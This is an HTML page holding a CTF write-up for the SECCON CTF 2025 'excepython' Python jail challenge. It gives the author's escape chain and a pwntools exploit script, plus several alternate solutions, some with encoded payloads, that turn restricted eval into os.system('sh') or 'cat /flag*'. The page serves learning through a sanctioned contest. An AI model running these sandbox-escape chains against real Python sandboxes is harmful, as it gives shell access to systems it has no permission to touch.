@@ -1,0 +1,612 @@
+<!-- https://raw.githubusercontent.com/mkdocs/mkdocs/refs/heads/master/mkdocs/themes/mkdocs/base.html -->
+<!DOCTYPE html>
+<html lang="en" data-bs-theme="light">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        
+        
+        <link rel="canonical" href="https://jia.je/ctf-writeups/2025-12-13-seccon-ctf-2025-quals/excepython.html">
+        <link rel="shortcut icon" href="../img/favicon.ico">
+        <title>excepython - CTF Writeups by @jiegec</title>
+        <link href="../css/bootstrap.min.css" rel="stylesheet">
+        <link href="../css/fontawesome.min.css" rel="stylesheet">
+        <link href="../css/brands.min.css" rel="stylesheet">
+        <link href="../css/solid.min.css" rel="stylesheet">
+        <link href="../css/v4-font-face.min.css" rel="stylesheet">
+        <link href="../css/base.css" rel="stylesheet">
+        <!-- added by @jiegec begin -->
+        <link href=" https://cdn.jsdelivr.net/npm/prismjs@1.30.0/themes/prism.min.css " rel="stylesheet">
+        <!-- added by @jiegec end -->
+        <!-- added by @jiegec begin -->
+        <script src="https://cdn.jsdelivr.net/npm/prismjs@1.30.0/components/prism-core.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/prismjs@1.30.0/plugins/autoloader/prism-autoloader.min.js"></script>
+        <!-- added by @jiegec end -->
+
+      <!-- added by @jiegec begin -->
+      <script defer src="https://cdn.jsdelivr.net/npm/mathjax@4/tex-mml-chtml.js"></script>
+      </script>
+      
+      <script async src="https://www.googletagmanager.com/gtag/js?id=G-3109FRSVTT"></script>
+      <script>
+          window.dataLayer = window.dataLayer || [];
+          function gtag() { dataLayer.push(arguments); }
+          gtag('js', new Date());
+      
+          gtag('config', 'G-3109FRSVTT');
+      </script>
+      
+      <script src="https://analytics.jiege.pro/api/script.js" data-site-id="1" defer></script>
+      <!-- added by @jiegec end --> 
+    </head>
+
+    <body>
+        <div class="navbar fixed-top navbar-expand-lg navbar-dark bg-primary">
+            <div class="container">
+                <a class="navbar-brand" href="../index.html">CTF Writeups by @jiegec</a>
+                <!-- Expander button -->
+                <button type="button" class="navbar-toggler" data-bs-toggle="collapse" data-bs-target="#navbar-collapse" aria-controls="navbar-collapse" aria-expanded="false" aria-label="Toggle navigation">
+                    <span class="navbar-toggler-icon"></span>
+                </button>
+
+                <!-- Expanded navigation -->
+                <div id="navbar-collapse" class="navbar-collapse collapse">
+                        <!-- Main navigation -->
+                        <ul class="nav navbar-nav">
+                            <li class="nav-item">
+                                <a href="../index.html" class="nav-link">Home</a>
+                            </li>
+                            <li class="nav-item">
+                                <a href="../misc/solution.html" class="nav-link">Writeups by Solution</a>
+                            </li>
+                            <li class="nav-item">
+                                <a href="../misc/pyjail.html" class="nav-link">Pyjail</a>
+                            </li>
+                            <li class="nav-item">
+                                <a href="../puppeteer/index.html" class="nav-link">Redbud Puppeteer</a>
+                            </li>
+                        </ul>
+
+                    <ul class="nav navbar-nav ms-md-auto">
+                        <li class="nav-item">
+                            <a href="#" class="nav-link" data-bs-toggle="modal" data-bs-target="#mkdocs_search_modal">
+                                <i class="fa fa-search"></i> Search
+                            </a>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <div class="container">
+            <div class="row">
+                    <div class="col-md-3"><div class="navbar-expand-md bs-sidebar hidden-print affix" role="complementary">
+    <div class="navbar-header">
+        <button type="button" class="navbar-toggler collapsed" data-bs-toggle="collapse" data-bs-target="#toc-collapse" title="Table of Contents">
+            <span class="fa fa-angle-down"></span>
+        </button>
+    </div>
+
+    
+    <div id="toc-collapse" class="navbar-collapse collapse card bg-body-tertiary">
+        <ul class="nav flex-column">
+            
+            <li class="nav-item" data-bs-level="1"><a href="#excepython" class="nav-link">excepython</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+        </ul>
+    </div>
+</div></div>
+                    <div class="col-md-9" role="main">
+
+<h1 id="excepython">excepython</h1>
+<p>Attachment:</p>
+<pre class="highlight"><code class="language-python">#!/usr/local/bin/python3
+ex = None
+while (code := input("jail&gt; ")) and all(code.count(c) &lt;= 1 for c in ".,(+)"):
+    try:
+        eval(code, {"__builtins__": {}, "ex": ex})
+    except Exception as e:
+        ex = e
+        print(type(ex), repr(ex.args))</code></pre>
+<p>Requirements:</p>
+<ol>
+<li>At most one occurrence for each character <code>.,(+)</code>: use lambda + <code>__getattribute__</code> for <code>a.b</code>, call function step by step, save intermediate values in exception <code>KeyError</code> via <code>{}[obj]</code></li>
+<li>No builtins: use <code>[].__setattr__.__objclass__.__subclasses__()[os_wrap_close_index].__init__.__globals__["system"]("sh")</code></li>
+</ol>
+<p>First, we need to know how to save data into exception. There are two ways I found:</p>
+<pre class="highlight"><code class="language-python"># KeyError
+&gt;&gt;&gt; try:
+...     {}[123]
+... except Exception as e:
+...     print(e.args)
+...
+(123,)
+# AttributeError
+&gt;&gt;&gt; try:
+...     object.zzz
+... except Exception as e:
+...     print(e.obj)
+...
+&lt;class 'object'&gt;</code></pre>
+<p>The first way has its limitations: the argument type cannot be list, otherwise the error will change and we can no longer maintain the object we want:</p>
+<pre class="highlight"><code class="language-python">&gt;&gt;&gt; try:
+...     {}[[1]]
+... except Exception as e:
+...     print(type(e))
+...     print(e.args)
+... 
+&lt;class 'TypeError'&gt;
+("unhashable type: 'list'",)</code></pre>
+<p>The second way consumes one <code>.</code>, which is not suitable for this challenge: we need an extra <code>.</code> in <code>ex.args</code> to access the object we saved, but we cannot use another one to save object to <code>ex</code>. So we have to use the first way to save object.</p>
+<p>Next, the problem is, how to access attributes? The vanilla <code>a.b</code> consumes one <code>.</code>, which is not feasible. We used the method from <a href="../misc/pyjail/jailctf-2025-one.html">jailCTF 2025 one</a>:</p>
+<pre class="highlight"><code class="language-python">lambda x,*y: x.__getattribute__(*y))</code></pre>
+<p>However, it consumes <code>,</code>. We change it to:</p>
+<pre class="highlight"><code class="language-python">lambda x: x[0].__getattribute__(*x[1:])</code></pre>
+<p>Next, we can follow the similar process of <a href="../misc/pyjail/jailctf-2025-one.html">jailCTF 2025 one</a> to get <code>class object</code>:</p>
+<pre class="highlight"><code class="language-python">try:
+    {}[g := lambda x: x[0].__getattribute__(*x[1:])]
+except Exception as e:
+    print(type(e))
+    print(repr(e.args))
+
+    try:
+        # [].__setattr__
+        {}[g := e.args[0], g([[]] + ["__setattr__"])]
+    except Exception as e:
+        print(type(e))
+        print(repr(e.args))
+
+        try:
+            # [].__setattr__.__objclass__
+            {}[g := e.args[0], g[0]([g[1]] + ["__objclass__"])]
+        except Exception as e:
+            print(type(e))
+            print(repr(e.args))</code></pre>
+<p>At this point, we need to pass three arguments (<code>[object, object, "__subclasses__"]</code> corresponding to <code>object.__getattribute__(object, "__subclasses__")</code>) to the <code>__getattribute__</code> lambda, to access <code>[].__setattr__.__objclass__.__subclasses__</code>. However, at this time, I did not find a way to do this. So, I went for another chain to access builtins: <code>[].__reduce_ex__(2)[0].__builtins__["__import__"]("os").system("sh")</code>:</p>
+<pre class="highlight"><code class="language-python">try:
+    {}[g := lambda x: x[0].__getattribute__(*x[1:])]
+except Exception as ex:
+    print(type(ex))
+    print(repr(ex.args[0]))
+
+    try:
+        # [].__reduce_ex__
+        {}[g := ex.args[0], g([[]] + ["__reduce_ex__"])]
+    except Exception as ex:
+        print(type(ex))
+        print(repr(ex.args[0]))
+
+        try:
+            # [].__reduce_ex__(2)[0]
+            {}[g := ex.args[0], g[1](2)[0]]
+        except Exception as ex:
+            print(type(ex))
+            print(repr(ex.args[0]))
+
+            try:
+                # [].__reduce_ex__(2)[0].__builtins__["__import__"]
+                {}[g := ex.args[0], g[0][0]([g[1]] + ["__builtins__"])["__import__"]]
+            except Exception as ex:
+                print(type(ex))
+                print(repr(ex.args[0]))
+
+                try:
+                    # [].__reduce_ex__(2)[0].__builtins__["__import__"]("os")
+                    {}[g := ex.args[0], g[1]("os")]
+                except Exception as ex:
+                    print(type(ex))
+                    print(repr(ex.args[0]))
+
+                    try:
+                        # [].__reduce_ex__(2)[0].__builtins__["__import__"]("os").system
+                        {}[g := ex.args[0], g[0][0][0][0]([g[1]] + ["system"])]
+                    except Exception as ex:
+                        print(type(ex))
+                        print(repr(ex.args[0]))
+
+                        try:
+                            # [].__reduce_ex__(2)[0].__builtins__["__import__"]("os").system("sh")
+                            {}[g := ex.args[0], g[1]("sh")]
+                        except Exception as ex:
+                            print(type(ex))
+                            print(repr(ex.args[0]))</code></pre>
+<p>However, when I port the attack to the jail environment, it always fails with missing <code>__import__</code> when running <code>__reduce_ex__</code>. Weird. So I had to return to the chain of <code>[].__setattr__.__objclass__.__subclasses__()[os_wrap_close_index].__init__.__globals__["system"]("sh")</code>, which required calling <code>a.__getattribute__(a, c)</code>: I used another lambda <code>g := lambda x: f([x[0]]+x)</code> where <code>f := lambda x: x[0].__getattribute__(*x[1:])</code> to achieve this:</p>
+<pre class="highlight"><code class="language-python">ex = None
+try:
+    {}[f := lambda x: x[0].__getattribute__(*x[1:])]
+except Exception as e:
+    ex = e
+    print(type(e))
+    print(repr(e.args[0]))
+
+try:
+    {}[f := ex.args[0], g := lambda x: f([x[0]]+x)]
+except Exception as e:
+    ex = e
+    print(type(e))
+    print(repr(e.args[0]))
+
+try:
+    # [].__setattr__
+    {}[g := ex.args, g[0][0]([[]] + ["__setattr__"])]
+except Exception as e:
+    ex = e
+    print(type(e))
+    print(repr(e.args[0]))
+
+try:
+    # [].__setattr__.__objclass__
+    {}[g := ex.args[0], g[0][0][0]([g[1]] + ["__objclass__"])]
+except Exception as e:
+    ex = e
+    print(type(e))
+    print(repr(e.args[0]))
+
+try:
+    # [].__setattr__.__objclass__.__subclasses__
+    {}[g := ex.args[0], g[0][0][0][1]([g[1]] + ["__subclasses__"])]
+except Exception as e:
+    ex = e
+    print(type(e))
+    print(repr(e.args[0]))
+
+try:
+    # index of os._wrap_close can be found via: print(str(object.__subclasses__()).split(', ').index("&lt;class 'os._wrap_close'&gt;"))
+    # [].__setattr__.__objclass__.__subclasses__()[166]
+    {}[g := ex.args[0], g[1]()[166]]
+except Exception as e:
+    ex = e
+    print(type(e))
+    print(repr(e.args[0]))
+
+try:
+    # [].__setattr__.__objclass__.__subclasses__()[166].__init__
+    {}[g := ex.args[0], g[0][0][0][0][0][1]([g[1]] + ["__init__"])]
+except Exception as e:
+    ex = e
+    print(type(e))
+    print(repr(e.args[0]))
+
+try:
+    # [].__setattr__.__objclass__.__subclasses__()[166].__init__.__globals__["system"]
+    {}[g := ex.args[0], g[0][0][0][0][0][0][0]([g[1]] + ["__globals__"])["system"]]
+except Exception as e:
+    ex = e
+    print(type(e))
+    print(repr(e.args[0]))
+
+try:
+    # [].__setattr__.__objclass__.__subclasses__()[166].__init__.__globals__["system"]("sh")
+    {}[g := ex.args[0], g[1]("sh")]
+except Exception as e:
+    ex = e
+    print(type(e))
+    print(repr(e.args[0]))</code></pre>
+<p>Now, change the os_wrap_close_index from 166 to 167 (find via <code>print(str(object.__subclasses__()).split(', ').index("&lt;class 'os._wrap_close'&gt;"))</code> in Python 3.14 in Docker) to match remote, and run the attack script to get shell:</p>
+<pre class="highlight"><code class="language-python">from pwn import *
+
+context(log_level="DEBUG")
+
+io = remote("excepython.seccon.games", 5000)
+
+# attack chain:
+# [].__setattr__.__objclass__.__subclasses__()[167].__init__.__globals__["system"]("sh")
+io.recvuntil(b"jail&gt;")
+io.sendline(b"{}[f := lambda x: x[0].__getattribute__(*x[1:])]")
+io.recvuntil(b"jail&gt;")
+io.sendline(b"{}[f := ex.args[0], g := lambda x: f([x[0]]+x)]")
+io.recvuntil(b"jail&gt;")
+io.sendline(b'{}[g := ex.args, g[0][0]([[]] + ["__setattr__"])]')
+io.recvuntil(b"jail&gt;")
+io.sendline(b'{}[g := ex.args[0], g[0][0][0]([g[1]] + ["__objclass__"])]')
+io.recvuntil(b"jail&gt;")
+io.sendline(b'{}[g := ex.args[0], g[0][0][0][1]([g[1]] + ["__subclasses__"])]')
+io.recvuntil(b"jail&gt;")
+io.sendline(b"{}[g := ex.args[0], g[1]()[167]]")
+io.recvuntil(b"jail&gt;")
+io.sendline(b'{}[g := ex.args[0], g[0][0][0][0][0][1]([g[1]] + ["__init__"])]')
+io.recvuntil(b"jail&gt;")
+io.sendline(
+    b'{}[g := ex.args[0], g[0][0][0][0][0][0][0]([g[1]] + ["__globals__"])["system"]]'
+)
+io.recvuntil(b"jail&gt;")
+io.sendline(b'{}[g := ex.args[0], g[1]("sh")]')
+
+# cat /flag*
+# SECCON{Pyth0n_was_m4de_for_jail_cha1lenges}
+io.interactive()</code></pre>
+<p>Solutions on Discord:</p>
+<p>Idea: use <code>\x2e</code> + <code>format</code> to bypass the limitation, use <code>AttributeError</code> to save object to <code>ex</code>.</p>
+<p>@HexF:</p>
+<p>Chain: <code>ex.__traceback__.tb_frame.f_globals["__builtins__"].exec('ex.__traceback__.tb_frame.f_globals["__builtins__"].__import__("os").system("cat /flag*")')</code></p>
+<pre class="highlight"><code class="language-python">x
+'{0\x2e__traceback__\x2etb_frame\x2ef_globals[__builtins__]\x2eexec\x2ea}'.format(ex)
+ex.obj('\x65\x78\x2e\x5f\x5f\x74\x72\x61\x63\x65\x62\x61\x63\x6b\x5f\x5f\x2e\x74\x62\x5f\x66\x72\x61\x6d\x65\x2e\x66\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5b\x22\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x22\x5d\x2e\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x22\x6f\x73\x22\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x22\x63\x61\x74\x20\x2f\x66\x6c\x61\x67\x2a\x22\x29')</code></pre>
+<p>@Peter:</p>
+<p>Chain: <code>ex.__traceback__.tb_frame.f_builtins["__import__"]("os").system("cat /flag-*")</code></p>
+<pre class="highlight"><code class="language-python">1/0
+'{0\x2e__traceback__\x2etb_frame\x2ef_builtins\x2e__nosuch__}'.format(ex)
+'{0\x2eobj[__import__]\x2e__nosuch__}'.format(ex)
+{}[ex.obj('os')]
+'{0\x2eargs[0]\x2esystem\x2e__nosuch__}'.format(ex)
+ex.obj('cat /flag-*')</code></pre>
+<p>@nikost:</p>
+<p>Chain: <code>ex.__class__.__mro__[4].__subclasses__()[os_wrap_index].__init__.__builtins__["__import__"]("os").system("/bin/bash")</code></p>
+<pre class="highlight"><code class="language-python">1/0
+"{0\x2e__class__\x2e__mro__[4]\x2e__subclasses__\x2epouet}".format(ex)
+[[ex := ex.obj()[167]] for i in '12']
+"{0\x2eobj\x2e__init__\x2e__builtins__[__import__]\x2epouet}".format(ex)
+[[ex := ex.obj('os') for i in '12']]
+"{0\x2eobj\x2esystem\x2epouet}".format(ex)
+ex.obj('/bin/bash')
+cat ../flag*</code></pre>
+<p>@D1N0:</p>
+<p>Reuse <code>.__getattribute__</code> using list comprehension, chain: <code>ex.__traceback__.tb_frame.f_builtins["eval"]("ex.__traceback__.tb_frame.f_builtins['__import__']('os').system('cat /flag*')")</code></p>
+<pre class="highlight"><code class="language-python">1/0
+[[[ex:=[ex["eval"] if idx=="d" else ex.__getattribute__][0](x)][0] for x in ["__traceback__" if idx == "a" else "tb_frame" if idx=="b" else "f_builtins" if idx=="c" else "ex['__import__']\x28'os'\x29\x2esystem\x28'cat /flag*'\x29"]][0] for idx in "abcd"]</code></pre>
+<p>A similar solution to mime by @huongnoi100%:</p>
+<p>Chain: <code>ex.__traceback__.tb_frame.f_globals["__builtins__"].__import__("os").system("cat /flag-*")</code></p>
+<pre class="highlight"><code class="language-python">jail&gt; {}[lambda d:[*d][0].__getattribute__(d[[*d][0]]),0]
+{}[ex.args[0][0],ex]
+{}[[s:=ex.args[0]] and s[0],s[0]({s[1]:'__traceback__'})]
+{}[[s:=ex.args[0]] and s[0],s[0]({s[1]:'tb_frame'})]
+{}[[s:=ex.args[0]] and s[0],s[0]({s[1]:'f_globals'})['__builtins__']]
+{}[[s:=ex.args[0]] and s[0],s[0]({s[1]:'__import__'})]
+{}[[s:=ex.args[0]] and s[0],s[1]('os')]
+{}[[s:=ex.args[0]] and s[0],s[0]({s[1]:'system'})]
+{}[[s:=ex.args[0]] and s[0],s[1]('cat /flag-*')]
+jail&gt; jail&gt; jail&gt; jail&gt; jail&gt; jail&gt; jail&gt; jail&gt; SECCON{Pyth0n_was_m4de_for_jail_cha1lenges}</code></pre>
+<p>@golden:</p>
+<p>Save the previous <code>ex</code> into <code>ex.args</code> and recover it:</p>
+<p>Chain: <code>''.__class__.__base__.__subclasses__()[os_wrap_index].__init__.__globals__["sys"].modules["os"].system("sh")</code></p>
+<pre class="highlight"><code class="language-python">{}[lambda f: ''.__class__,ex]
+{}[[x:=ex.args[0],x][0][0](x[1])]
+{}[lambda f: f.__base__,ex]
+{}[*[x:=lambda f:f.args][0](ex)[0],x]
+{}[*[f:=ex.args[0]][0][:1],f[2](f[1])[0]]
+{}[[x:=ex.args[0],x][0][0](x[1])]
+{}[lambda f: f.__subclasses__(),ex]
+{}[*[x:=lambda f:f.args][0](ex)[0],x]
+{}[*[f:=ex.args[0]][0][:1],[f[2](f[1])[0]][0]]
+{}[*[x:=ex.args[0],x][0][0](x[1])] # edited to unpack subclasses
+{}[lambda f: [c for c in f if 'wrap_close' in ''.__class__(c)][0],ex]
+{}[*[x:=lambda f:f.args][0](ex)[0],x]
+{}[*[f:=ex.args[0]][0][:1],[f[2](f[1])[0]][0]]
+{}[[x:=ex.args[0],x][0][0](x[1])]
+{}[lambda f: f.__init__,ex]
+{}[*[x:=lambda f:f.args][0](ex)[0],x]
+{}[*[f:=ex.args[0]][0][:1],f[2](f[1])[0]]
+{}[[x:=ex.args[0],x][0][0](x[1])]
+{}[lambda f: f.__globals__['sys'],ex]
+{}[*[x:=lambda f:f.args][0](ex)[0],x]
+{}[*[f:=ex.args[0]][0][:1],f[2](f[1])[0]]
+{}[[x:=ex.args[0],x][0][0](x[1])]
+{}[lambda f: f.modules['os'],ex]
+{}[*[x:=lambda f:f.args][0](ex)[0],x]
+{}[*[f:=ex.args[0]][0][:1],f[2](f[1])[0]]
+{}[[x:=ex.args[0],x][0][0](x[1])]
+{}[lambda f: f.system('sh'),ex]
+{}[*[x:=lambda f:f.args][0](ex)[0],x]
+{}[*[f:=ex.args[0]][0][:1],f[2](f[1])[0]]
+{}[[x:=ex.args[0],x][0][0](x[1])]</code></pre>
+<p>@oh_word:</p>
+<pre class="highlight"><code class="language-python">enc_str = lambda s: '"%s"' % "".join(f"\\x{ord(c):02X}" for c in s)
+
+slp(f'{enc_str("{.__class__.__base__.__subclasses__.x}")}.format(0)')
+slp(f"[0 for ex.__typing_subst__ in [lambda a,k={{}}: [k['r'] for k['r'] in [[a[0] if 'r' not in k else k['r']][0](*a[1:])]][0]]]")
+slp("[sb:=ex.obj()]and sb[0][ex][[sb[-1]]]")
+slp("[sb:=ex.obj()]and sb[0][ex][[-1]]")
+sla(b"help&gt; ", b"subprocess")
+sla(b"help&gt; ", b"q")
+
+slp(f"[0 for ex.__typing_subst__ in [lambda a,k={{}}: [k['r'] for k['r'] in [[a[0] if 'r' not in k else k['r']][0](*a[1:])]][0]]]")
+slp("[sb:=ex.obj()]and sb[0][ex][[sb[306], ['/usr/bin/cat']+['/flag-d108ec7a911b72568e8aa0855f1787d8\\x2etxt']]]")
+
+p.interactive()</code></pre>
+<p>@uNickz:</p>
+<pre class="highlight"><code class="language-python">#!/usr/bin/env python3
+
+from pwn import *
+
+if args.DEBUG:
+    context.log_level = "DEBUG"
+
+host, port = "excepython.seccon.games", 5000
+
+rr  = lambda *x, **y: io.recvrepeat(*x, **y)
+ru  = lambda *x, **y: io.recvuntil(*x, **y)
+rl  = lambda *x, **y: io.recvline(*x, **y)
+rc  = lambda *x, **y: io.recv(*x, **y)
+sla = lambda *x, **y: io.sendlineafter(*x, **y)
+sa  = lambda *x, **y: io.sendafter(*x, **y)
+sl  = lambda *x, **y: io.sendline(*x, **y)
+sn  = lambda *x, **y: io.send(*x, **y)
+
+# -- Exploit goes here --
+
+io = remote(host, port)
+
+payloads = """
+    1/0
+
+    # args[0] = lambda function
+    # args[1] = exception instance
+    # args[2] = attribute name to get from exception instance
+
+    # (lambda, ZeroDivisionError('division by zero'))
+    {}[ lambda *args: [args[0]] + [args[1].__getattribute__( *args[2:][-2:] )], ex ]
+
+    # (lambda .__class__, &lt;class 'ZeroDivisionError'&gt;)
+    {}[ *[a:=ex.args[0], a[0]( *[*a]+["__class__"] )][1] ]
+
+    # (lambda .__class__, &lt;class 'type'&gt;)
+    {}[ *[a:=ex.args[0], a[0]( *[*a]*2+["__class__"] )][1] ]
+
+    # (lambda .__base__, &lt;class 'object'&gt;)
+    {}[ *[a:=ex.args[0], a[0]( *[*a]*2+["__base__"] )][1] ]
+
+    # (lambda .__subclasses__, &lt;built-in method __subclasses__&gt;)
+    {}[ *[a:=ex.args[0], a[0]( *[*a]*2+["__subclasses__"] )][1] ]
+
+    # (lambda .__subclasses__(), &lt;class 'os._wrap_close'&gt;)
+    {}[ *[ a:=ex.args[0], [a[0]]+[a[1]()[167]] ][1] ]
+
+    # (lambda, &lt;function _wrap_close.__init__&gt;)
+    {}[ *[a:=ex.args[0], a[0]( *[*a]*2+["__init__"] )][1] ]
+
+    # (&lt;built-in function system&gt;, )
+    {}[ [a:=ex.args[0], a[0]( *[*a]+["__globals__"] )[1]["system"] ][1] ]
+
+    ex.args[0]("sh")
+"""
+
+for payload in payloads.strip().splitlines():
+    payload = payload.strip()
+    if payload.startswith("#"): continue
+    payload = payload.split("#", 1)[0].strip()
+    if not payload: continue
+    sla(b"jail&gt; ", payload.strip().encode())
+
+io.interactive() # SECCON{Pyth0n_was_m4de_for_jail_cha1lenges}
+io.close()</code></pre>
+<p>@Muhammed.:</p>
+<pre class="highlight"><code class="language-python"># ex.__traceback__.tb_frame.f_builtins['eval']
+# ex.__traceback__.tb_frame.f_builtins['eval']('().__class__.__class__.__subclasses__([].__class__.__class__)[0].register.__builtins__["__import__"]("os").system("sh")')
+[
+    [
+    [[o:=ex] if i == "0" else 0] and
+    [[s:="__traceback__"] if i == "0" else 0] and
+    [[s:="tb_frame"] if i == "1" else 0] and
+    [[s:="f_builtins"] if i == "2" else 0] and
+    [[s:="\50\51\56\137\137\143\154\141\163\163\137\137\56\137\137\143\154\141\163\163\137\137\56\137\137\163\165\142\143\154\141\163\163\145\163\137\137\50\133\135\56\137\137\143\154\141\163\163\137\137\56\137\137\143\154\141\163\163\137\137\51\133\60\135\56\162\145\147\151\163\164\145\162\56\137\137\142\165\151\154\164\151\156\163\137\137\133\42\137\137\151\155\160\157\162\164\137\137\42\135\50\42\157\163\42\51\56\163\171\163\164\145\155\50\42\163\150\42\51"] if i == "3" else 0] and
+    [[tt:=o.__getattribute__] if i == "0" or i == "1" or i == "2" else 0] and
+    [[tt:=o['eval']] if i == "3" else 0] and
+    [[o:=tt(s)] if True else 0]
+    ] for i in "0123"
+]
+
+jail&gt; muhammed
+jail&gt; [ [ [[o:=ex] if i == "0" else 0] and [[s:="__traceback__"] if i == "0" else 0] and [[s:="tb_frame"] if i == "1" else 0] and [[s:="f_builtins"] if i == "2" else 0] and [[s:="\50\51\56\137\137\143\154\141\163\163\137\137\56\137\137\143\154\141\163\163\137\137\56\137\137\163\165\142\143\154\141\163\163\145\163\137\137\50\133\135\56\137\137\143\154\141\163\163\137\137\56\137\137\143\154\141\163\163\137\137\51\133\60\135\56\162\145\147\151\163\164\145\162\56\137\137\142\165\151\154\164\151\156\163\137\137\133\42\137\137\151\155\160\157\162\164\137\137\42\135\50\42\157\163\42\51\56\163\171\163\164\145\155\50\42\163\150\42\51"] if i == "3" else 0] and [[tt:=o.__getattribute__] if i == "0" or i == "1" or i == "2" else 0] and [[tt:=o['eval']] if i == "3" else 0] and [[o:=tt(s)] if True else 0] ] for i in "0123" ]</code></pre>
+<p>@xtea418:</p>
+<pre class="highlight"><code class="language-python">from pwn import remote
+
+def encode(s: str):
+    fin = ""
+    for c in s:
+        fin += r"\x" + hex(ord(c))[2:]
+    return fin
+
+
+payload = ["1/0"]
+payload.append(f"'{encode('{0.__traceback__.tb_frame.f_builtins[exec].a}')}'.format(ex)")
+payload.append(
+    f"ex.obj('{encode("[].__class__.__base__.__subclasses__()[-2].__init__.__builtins__['__import__']('os').system('sh')")}')"
+)
+rem = remote("excepython.seccon.games", 5000)
+for line in payload:
+    rem.sendlineafter(b"jail&gt;", line)
+rem.interactive()</code></pre></div>
+
+                <!-- added by @jiegec begin -->
+                <div class="col-md-3"></div>
+                <div class="col-md-9">
+                  <script src="https://giscus.app/client.js"
+                      data-repo="jiegec/ctf-writeups"
+                      data-repo-id="MDEwOlJlcG9zaXRvcnkxNTE1MzAxODQ="
+                      data-category="General"
+                      data-category-id="DIC_kwDOCQgqyM4CvbYX"
+                      data-mapping="pathname"
+                      data-strict="1"
+                      data-reactions-enabled="1"
+                      data-emit-metadata="0"
+                      data-input-position="top"
+                      data-theme="light"
+                      data-lang="en"
+                      data-loading="lazy"
+                      crossorigin="anonymous"
+                      async>
+                  </script>
+                </div>
+                <!-- added by @jiegec end -->
+            </div>
+        </div>
+
+        <footer class="col-md-12">
+            <hr>
+                <p>Copyright &copy; 2025 Jiajie Chen</p>
+            <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a>.</p>
+        </footer>
+        <script src="../js/bootstrap.bundle.min.js"></script>
+        <script>
+            var base_url = "..",
+                shortcuts = {"help": 191, "next": 78, "previous": 80, "search": 83};
+        </script>
+        <script src="../js/base.js"></script>
+        <script src="../search/main.js"></script>
+
+        <div class="modal" id="mkdocs_search_modal" tabindex="-1" role="dialog" aria-labelledby="searchModalLabel" aria-hidden="true">
+    <div class="modal-dialog modal-lg">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h4 class="modal-title" id="searchModalLabel">Search</h4>
+                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+            </div>
+            <div class="modal-body">
+                <p>From here you can search these documents. Enter your search terms below.</p>
+                <form>
+                    <div class="form-group">
+                        <input type="search" class="form-control" placeholder="Search..." id="mkdocs-search-query" title="Type search term here">
+                    </div>
+                </form>
+                <div id="mkdocs-search-results" data-no-results-text="No results found"></div>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div><div class="modal" id="mkdocs_keyboard_modal" tabindex="-1" role="dialog" aria-labelledby="keyboardModalLabel" aria-hidden="true">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h4 class="modal-title" id="keyboardModalLabel">Keyboard Shortcuts</h4>
+                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+            </div>
+            <div class="modal-body">
+              <table class="table">
+                <thead>
+                  <tr>
+                    <th style="width: 20%;">Keys</th>
+                    <th>Action</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td class="help shortcut"><kbd>?</kbd></td>
+                    <td>Open this help</td>
+                  </tr>
+                  <tr>
+                    <td class="next shortcut"><kbd>n</kbd></td>
+                    <td>Next page</td>
+                  </tr>
+                  <tr>
+                    <td class="prev shortcut"><kbd>p</kbd></td>
+                    <td>Previous page</td>
+                  </tr>
+                  <tr>
+                    <td class="search shortcut"><kbd>s</kbd></td>
+                    <td>Search</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div>
+
+    </body>
+</html>
